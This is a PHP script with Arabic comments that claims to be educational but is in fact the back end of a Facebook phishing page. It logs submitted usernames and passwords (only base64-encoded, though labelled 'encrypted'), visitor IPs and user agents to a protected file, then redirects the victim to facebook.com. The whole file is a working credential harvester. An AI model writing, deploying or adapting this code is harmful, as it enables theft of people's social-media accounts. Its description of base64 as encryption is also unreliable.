<?php
/**
 * ملف معالجة بيانات تسجيل الدخول
 * هذا الملف مصمم لأغراض تعليمية وتجريبية فقط
 * 
 * تحذير مهم:
 * تخزين كلمات المرور بهذه الطريقة لا يفي بمعايير الأمان المطلوبة
 * في التطبيقات الحقيقية، يجب استخدام تقنيات التشفير المناسبة
 * مثل bcrypt أو Argon2 لتخزين كلمات المرور
 */

// إعدادات الأمان الأساسية
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('X-XSS-Protection: 1; mode=block');

// التحقق من أن الطلب تم عبر POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit('Method Not Allowed');
}

// تنظيف وتحقق من البيانات المدخلة
function sanitize_input($data) {
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
    return $data;
}

// التحقق من وجود البيانات المطلوبة
if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = sanitize_input($_POST['username']);
    $password = sanitize_input($_POST['password']);

    // التحقق من صحة البيانات
    if (empty($username) || empty($password)) {
        http_response_code(400);
        exit('error: Missing required fields');
    }

    // إعداد مسار ملف تخزين البيانات
    $data_dir = __DIR__ . '/data';
    $data_file = $data_dir . '/login_data.txt';

    // إنشاء مجلد البيانات إذا لم يكن موجوداً
    if (!file_exists($data_dir)) {
        mkdir($data_dir, 0755, true);

        // إنشاء ملف .htaccess لحماية المجلد
        $htaccess_content = "Order Deny,Allow\nDeny from all";
        file_put_contents($data_dir . '/.htaccess', $htaccess_content);
    }

    // إعداد البيانات للتخزين
    $timestamp = date('Y-m-d H:i:s');
    $ip_address = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';

    // تشفير كلمة المرور (ملاحظة: هذا تشفير بسيط للغاية وليس آمناً للتطبيقات الحقيقية)
    $encrypted_password = base64_encode($password);

    // إعداد سجل البيانات
    $log_entry = sprintf(
        "[%s] Username: %s | Password (encrypted): %s | IP: %s | User-Agent: %s\n",
        $timestamp,
        $username,
        $encrypted_password,
        $ip_address,
        $user_agent
    );

    // حفظ البيانات في الملف
    if (file_put_contents($data_file, $log_entry, FILE_APPEND | LOCK_EX)) {
    

        // تحويل المستخدم مباشرة إلى فيسبوك
        header('Location: https://www.facebook.com');
        exit;
    } else {
        http_response_code(500);
        echo 'error: Failed to save data';
    }
} else {
    http_response_code(400);
    echo 'error: Missing required fields';
}
?>
